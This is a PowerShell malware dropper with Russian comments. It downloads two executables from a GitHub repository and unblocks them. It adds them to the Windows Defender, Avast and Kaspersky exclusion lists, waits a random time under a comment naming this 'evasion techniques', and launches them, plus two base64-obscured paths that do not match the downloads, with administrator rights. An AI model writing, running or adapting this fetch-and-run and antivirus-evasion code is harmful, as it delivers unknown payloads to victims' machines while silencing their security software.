# Функция для добавления файла в исключения Windows Defender
function Add-To-WindowsDefender-Exclusion {
    param (
        [string]$filePath
    )

    if (-Not (Test-Path -Path $filePath)) {
        Write-Warning "Файл $filePath не найден."
        return
    }

    try {
        $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

        if ($currentExclusions -contains $filePath) {
            Write-Output "Файл $filePath уже добавлен в исключения Windows Defender."
        } else {
            Add-MpPreference -ExclusionPath $filePath
            Write-Output "Файл $filePath успешно добавлен в исключения Windows Defender."
        }
    } catch {
        Write-Error "Ошибка при добавлении файла $filePath в исключения Windows Defender: $_"
    }
}

# Функция для добавления файла в исключения Avast Antivirus
function Add-To-Avast-Exclusion {
    param (
        [string]$filePath
    )

    if (-Not (Test-Path -Path $filePath)) {
        Write-Warning "Файл $filePath не найден."
        return
    }

    try {
        $avastProcess = Get-Process -Name avast -ErrorAction SilentlyContinue
        if ($avastProcess) {
            Start-Process -FilePath "C:\Program Files\AVAST Software\Avast\avast.exe" -ArgumentList "/exclude add $filePath" -Verb RunAs -Wait
            Write-Output "Файл $filePath успешно добавлен в исключения Avast Antivirus."
        } else {
            Write-Warning "Avast Antivirus не запущен."
        }
    } catch {
        Write-Error "Ошибка при добавлении файла $filePath в исключения Avast Antivirus: $_"
    }
}

# Функция для добавления файла в исключения Kaspersky Antivirus
function Add-To-Kaspersky-Exclusion {
    param (
        [string]$filePath
    )

    if (-Not (Test-Path -Path $filePath)) {
        Write-Warning "Файл $filePath не найден."
        return
    }

    try {
        $kasperskyProcess = Get-Process -Name avp -ErrorAction SilentlyContinue
        if ($kasperskyProcess) {
            Start-Process -FilePath "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Anti-Virus 20.xx\avp.com" -ArgumentList "/add-exclusion=$filePath" -Verb RunAs -Wait
            Write-Output "Файл $filePath успешно добавлен в исключения Kaspersky Antivirus."
        } else {
            Write-Warning "Kaspersky Antivirus не запущен."
        }
    } catch {
        Write-Error "Ошибка при добавлении файла $filePath в исключения Kaspersky Antivirus: $_"
    }
}

# Функция для разблокировки файлов
function Unblock-FileIfBlocked {
    param (
        [string]$filePath
    )
    if (Get-Item $filePath -ErrorAction SilentlyContinue) {
        Unblock-File -Path $filePath
        Write-Output "Файл $filePath разблокирован."
    } else {
        Write-Warning "Файл $filePath не найден или доступ к нему ограничен."
    }
}

# Пути к файлам
$file1 = "C:\1.exe"
$file2 = "C:\2.exe"

# Загрузка файлов
try {
    Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/1.exe" -OutFile $file1
    Write-Output "Файл 1.exe успешно загружен."
} catch {
    Write-Error "Ошибка при загрузке файла 1.exe: $_"
}

try {
    Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/2.exe" -OutFile $file2
    Write-Output "Файл 2.exe успешно загружен."
} catch {
    Write-Error "Ошибка при загрузке файла 2.exe: $_"
}

# Разблокировка файлов перед исключениями
Unblock-FileIfBlocked -filePath $file1
Unblock-FileIfBlocked -filePath $file2

# Добавление в исключения Windows Defender
Add-To-WindowsDefender-Exclusion -filePath $file1
Add-To-WindowsDefender-Exclusion -filePath $file2

# Добавление в исключения Avast Antivirus
Add-To-Avast-Exclusion -filePath $file1
Add-To-Avast-Exclusion -filePath $file2

# Добавление в исключения Kaspersky Antivirus
Add-To-Kaspersky-Exclusion -filePath $file1
Add-To-Kaspersky-Exclusion -filePath $file2

# Эвазионные техники
Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)

# Обфускация путей
$obfuscatedPath1 = [System.Convert]::FromBase64String("QzpcMVguZXhl")
$obfuscatedPath2 = [System.Convert]::FromBase64String("QzpcMngueGV4ZQ==")

$decodedPath1 = [System.Text.Encoding]::UTF8.GetString($obfuscatedPath1)
$decodedPath2 = [System.Text.Encoding]::UTF8.GetString($obfuscatedPath2)

Start-Process -FilePath $decodedPath1 -Verb RunAs
Start-Process -FilePath $decodedPath2 -Verb RunAs

# Завершающий запуск файлов с правами администратора
Start-Process -FilePath $file1 -Verb RunAs
Start-Process -FilePath $file2 -Verb RunAs
